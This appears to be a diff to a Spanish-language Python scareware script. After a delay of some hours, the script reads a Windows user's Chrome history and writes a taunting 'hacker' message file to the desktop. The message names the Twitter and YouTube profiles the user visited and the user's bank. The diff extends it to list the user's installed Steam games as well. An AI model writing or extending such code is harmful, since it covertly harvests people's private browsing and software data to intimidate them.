@@ -4,7 +4,7 @@
 import os
 import re
 import sqlite3
-from time import sleep
+from time import sleep, ctime
 from random import randrange
 
 #Creando el archivo donde se guardara la información del script
@@ -65,7 +65,7 @@ def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
         if chequer:
             if channel_name:
                 profiles_visited.add(channel_name)
-    hacker_file.write(f"\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
+    hacker_file.write(f"\n\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
                       f"ajaaaa.....")
 
 def check_bank_account(hackage_file,chrome_history):
@@ -78,7 +78,18 @@ def check_bank_account(hackage_file,chrome_history):
                 break
         if his_bank:
             break
-    hackage_file.write(f"\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")
+    hackage_file.write(f"\n\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")
+
+def check_steam_games(hackage_file):
+    try:
+        steam_path = "C:/Program Files (x86)/Steam/steamapps/common"
+        games_listed = os.listdir(steam_path)
+        games = []
+        for item in games_listed:
+            games.append(item.split("\\")[-1])
+        hackage_file.write("\n\nTambien he visto que has instalados los juegos de {}... fichao".format(", ".join(games)))
+    except FileNotFoundError as e:
+        print("El usuario no tiene instalado Steam :(")
 
 def main():
     #Esperamos algunas horas para que se ejecute el script
@@ -87,14 +98,16 @@ def main():
     #Calculamos la ruta del escritorio del usuario de Windows
     desktop_path = get_user_path()
 
+    # Obtenemos su historial de Google Chrome cuando sea posible
+    chrome_history = get_chrome_history()
+
     #Creamos el archivo del mensaje hacker en el escritorio
     hacker_file = create_hacker_file(desktop_path)
 
-    #Obtenemos su historial de Google Chrome cuando sea posible
-    chrome_history = get_chrome_history()
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
     check_youtube_profiles_and_scare_user(hacker_file,chrome_history)
     check_bank_account(hacker_file, chrome_history)
+    check_steam_games(hacker_file)
 
 if __name__ == "__main__":
     main()
